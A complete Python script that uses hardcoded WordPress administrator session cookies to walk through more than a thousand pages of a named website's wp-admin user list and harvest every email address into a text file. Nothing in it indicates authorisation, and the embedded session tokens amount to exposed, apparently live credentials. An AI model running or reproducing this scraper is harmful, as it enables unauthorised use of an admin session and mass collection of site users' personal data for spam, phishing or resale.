#!/usr/bin/env python3

import requests
import re
import time



BASE_URL = "https://www.heavenlytouch.kr/wp-admin/users.php"

START_PAGE = 1
END_PAGE = 1003

OUTPUT_FILE = "emails.txt"

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 Chrome/120 Safari/537.36"
    ),
    "Cookie": "wordpress_dbe2eaa6ab8acab40b545a9cdd80e8ad=karai00154%7C1786832604%7CVxhKjwhfUWLT41wsbFY01efcUTUvnl61MTiUX2TxfMe%7C0b1bf754ee80d5201ee4f6eca7dcd6abf6882884a471b4d00e01ef295d23f278; wordpress_sec_dbe2eaa6ab8acab40b545a9cdd80e8ad=karai00154%7C1786832604%7CmCpDvZ7fy5PdSqTJPxbKg2VecC9XJWAxPbGgtXb68S9%7Cd9b8b261457d2313c615e7bbf8e41c688f94a013bf79b8508ad05e839a2b158a; quform_session_dbe2eaa6ab8acab40b545a9cdd80e8ad=w1MsHsgkEMPBgcHrcAHTAmjYxv5xiHztw9oqY09h; PHPSESSID=k94g02q4vn91hrilkubapek881; cactus-retina=0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_dbe2eaa6ab8acab40b545a9cdd80e8ad=karai00154%7C1786832604%7CmCpDvZ7fy5PdSqTJPxbKg2VecC9XJWAxPbGgtXb68S9%7C7ffd72787eb903c414e9b94f0ea5ae7c6d8788e624c64a53af4dd95c3fcfb7d5; wp-settings-time-5506992=1786702716"
}



def extract_emails(html):

    pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

    return set(re.findall(pattern, html))


def fetch_page(page):

    url = f"{BASE_URL}?paged={page}"

    try:
        response = requests.get(
            url,
            headers=HEADERS,
            # cookies=COOKIES,
            timeout=20,
            verify=True
        )

        response.raise_for_status()

        return response.text


    except requests.RequestException as e:

        print(
            f"[ERROR] Page {page}: {e}"
        )

        return None



# ==========================
# Main
# ==========================

def main():

    all_emails = set()

    with open(
        OUTPUT_FILE,
        "w",
        encoding="utf-8"
    ) as f:

        for page in range(
            START_PAGE,
            END_PAGE + 1
        ):

            print(
                f"[+] Processing page {page}/{END_PAGE}"
            )


            html = fetch_page(page)


            if html:

                emails = extract_emails(html)

                if emails:

                    print(
                        f"    Found {len(emails)} emails"
                    )

                    for email in emails:

                        if email not in all_emails:

                            all_emails.add(email)

                            f.write(
                                email + "\n"
                            )

                            f.flush()


            time.sleep(1)



    print(
        "\nFinished"
    )

    print(
        f"Total emails: {len(all_emails)}"
    )

    print(
        f"Saved to {OUTPUT_FILE}"
    )



if __name__ == "__main__":
    main()